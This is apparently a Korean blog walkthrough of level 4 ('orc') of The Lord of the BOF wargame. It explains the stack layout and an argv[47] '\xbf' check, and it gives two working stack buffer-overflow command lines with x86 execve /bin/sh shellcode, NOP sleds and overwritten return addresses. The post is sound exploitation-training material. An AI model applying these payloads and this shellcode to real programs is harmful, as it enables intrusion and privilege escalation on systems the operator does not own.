---
layout: post
title: "The Lord of the BOF - Level 4"
comments: true
categories: [LOB]
tags: [LOB]
---
<img data-action="zoom" src='{{ "assets/lob/level4/1.jpg" | relative_url }}' alt='relative'>  

## 1) goblin/hackers proof 입력하여 로그인하기  

<img data-action="zoom" src='{{ "assets/lob/level4/2.png" | relative_url }}' alt='relative'>  

이번 문제는 eggshell 헌터가 있네요.  
argv[1] 문자열 배열에서 47번째 문자가 '\xbf'가 아닌 경우 프로그램이 강제 종료합니다.  

<img data-action="zoom" src='{{ "assets/lob/level4/3.png" | relative_url }}' alt='relative'>  

orc 프로그램의 소스코드를 새로 컴파일하여 gdb로 실행했습니다.  

동일한 방식으로 프로그램을 2번 실행한 결과입니다.  

<img data-action="zoom" src='{{ "assets/lob/level4/4.png" | relative_url }}' alt='relative'>  

<img data-action="zoom" src='{{ "assets/lob/level4/5.png" | relative_url }}' alt='relative'>  

ebp 레지스터가 가리키는 주소는 변하지 않았습니다.  
ASLR이 적용되지 않았나 봅니다.  

## 2) 스택 구조 살펴보기  

<img data-action="zoom" src='{{ "assets/lob/level4/6.png" | relative_url }}' alt='relative'>  

<img data-action="zoom" src='{{ "assets/lob/level4/7.png" | relative_url }}' alt='relative'>  

원래는 &envp와 argv 사이에 auxv가 들어있긴 하지만 이 부분에서는 설명하지 않겠습니다.  
&envp 보라색 부분과 argv 녹색 부분 사이에 아무 표시 하지 않은 데이터들이 auxv입니다.  

스택의 구조를 보면 argv로 할당된 주소 공간은 사용자가 입력한 길이에 따라 유동적으로 늘어납니다.  

## 3) 공격 페이로드 입력하여 BOF 일으키기  

### (1) buffer 배열에 쉘코드 입력하고 buffer 배열의 주소를  RET에 입력하기  

ebp 레지스터가 가리키는 주소는 0xbffffb38 입니다.  

``` bash
0x80485b9 <main+185>:  lea    %eax,[%ebp-40]
0x80485bc <main+188>:  push   %eax
0x80485bd <main+189>:  call   0x8048440 <strcpy>
```

배열의 위치는 ebp 레지스터가 가리키는 주소에서 40 byte 뺀 거리에 위치합니다.  
그러면 buffer 배열의 시작 주소는 0xbffffb10 입니다.  

``` bash
./orc `python -c 'print "\x90"*19+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x10\xfb\xff\xbf"'`
```

이 방법을 사용하면 orc 프로그램에서 ebp 레지스터가 가리키는 주소와 buffer 배열이 위치한 주소를 정확히 알아야합니다.  
왜냐하면 NOP이 매우 짧기 때문입니다.  

### (2) 환경변수 내용이 저장되는 envp 배열 위치에 쉘코드 입력하기  

<img data-action="zoom" src='{{ "assets/lob/level4/8.png" | relative_url }}' alt='relative'>  

<img data-action="zoom" src='{{ "assets/lob/level4/9.png" | relative_url }}' alt='relative'>  

strcpy 함수가 실행되기 전(위)과 후(아래)로 스택에 저장된 값이 변경되었습니다.  

<img data-action="zoom" src='{{ "assets/lob/level4/10.png" | relative_url }}' alt='relative'>  

strcpy 함수가 실행되기 전(0x80485bd, <main+189>)에는 프로그램 실행 시 인자로 입력한 문자열이 0xbffffb7c 라인의 0xbffffb82 주소부터 시작합니다.  

strcpy 함수가 실행하여 0xbffffb82부터 0xbffffc7a까지 있던 248개의 문자열을 buffer 문자열 배열의 시작 주소인 0xbffffa00부터 0xbffffaf8까지 덮어 썼습니다.  


프로그램을 실행할 때 인자로 입력하는 문자열에 엄청 많은 수의 NOP을 입력하고 그 뒤에 쉘코드를 입력하면 ebp 레지스터가 가리키는 주소 이후의 아무 주소를 가리켜도 쉘코드가 실행될 것입니다.  

한 0xbffffbfc 이 주소 부근에 쉘코드가 저장되어 있다고 가정하고 공격 페이로드를 작성합니다.  
해당 주소는 제가 임의로 정한거고 무조건 저 주소를 써야하는건 아닙니다.  

``` bash 
./orc `python -c 'print "\x90"*44+"\xfc\xfb\xff\xbf"+"\x90"*1000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
```

<img data-action="zoom" src='{{ "assets/lob/level4/11.png" | relative_url }}' alt='relative'>  

이처럼 level5의 권한으로 배시쉘이 실행되었습니다.  

<img data-action="zoom" src='{{ "assets/lob/level4/12.png" | relative_url }}' alt='relative'>  
